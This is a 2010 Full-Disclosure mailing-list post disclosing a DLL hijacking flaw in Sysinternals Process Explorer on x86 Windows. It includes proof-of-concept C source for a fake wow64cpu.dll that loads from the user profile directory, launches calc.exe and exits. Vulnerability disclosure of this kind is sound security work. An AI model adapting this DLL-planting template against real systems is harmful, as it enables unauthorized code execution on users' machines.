
Date: Fri, 17 Sep 2010 23:44:44 +0200
From: miom <miom@....net>
To: full-disclosure@...ts.grok.org.uk
Subject: Sysinternals Process Explorer DLL Hijacking on
 x86 Windows systems (wow64cpu.dll)



I sent this one a while ago to offsec but it wasn't added.
It's rather an experimental attack vector and not a real threat since the dll has to be placed inside the %UserProfile% directory.
It might work on Windows7 and Vista 32 bit too, but I didn't test it.

/*
  * Exploit Title:   Sysinternals Process Explorer DLL Hijacking on x86 Windows systems (wow64cpu.dll)
  * Date:            27 Aug 2010
  * Author:          miom
  * Software Link:   http://technet.microsoft.com/sysinternals/bb896653.aspx
  * Version:         Process Explorer v12.04
  * Tested on:       Windows XP SP3 x86
  *
  * This exploit targets x86 Windows systems that use Sysinternals Process Explorer as their task manager.
  * Invoking this program with ctrl+alt+del or ctrl+shift+esc will set the cwd to the user directory (%UserProfile%).
  * If you place there this dll it will be loaded since it's missing in the directories with a higher
  * loading priority.
  */

#include<windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
     static int call_once = 1;

     if(call_once){
         call_once = 0;
         MessageBox(NULL, "Greetings from your hijacked dll.\n"
                          "We'll run calc.exe instead of your program harhar>)", "Vulnerable!", MB_OK | MB_ICONINFORMATION);
         ShellExecute(NULL, "open", "calc.exe", NULL, NULL, SW_SHOWNORMAL);
         ExitProcess(0);
     }

	return TRUE;
}

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
